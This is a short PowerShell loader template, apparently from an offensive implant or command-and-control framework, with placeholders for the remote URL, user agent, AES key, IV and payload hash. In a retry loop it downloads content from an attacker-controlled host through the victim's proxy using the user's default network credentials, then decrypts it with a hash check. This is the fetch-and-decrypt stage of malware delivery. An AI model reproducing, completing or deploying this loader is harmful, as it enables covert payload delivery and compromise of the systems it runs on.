For ($i=0; $i -le ~RETRYNUM~; $i++) {
    [System.Net.ServicePointManager]::Expect100Continue=0;
    $wc = New-Object Net.WebClient
    $wc.Headers.Add('User-Agent','~HKUSERAGENT')
    $wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy
    $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
    $resp = $wc.DownloadString('~HKURL~')   

    Get-AESDecrypted $resp '~HKPAYLOAD~' '~HKIV~' '~HKPAYLOADHASH~' 0
    Start-Sleep 30
   
}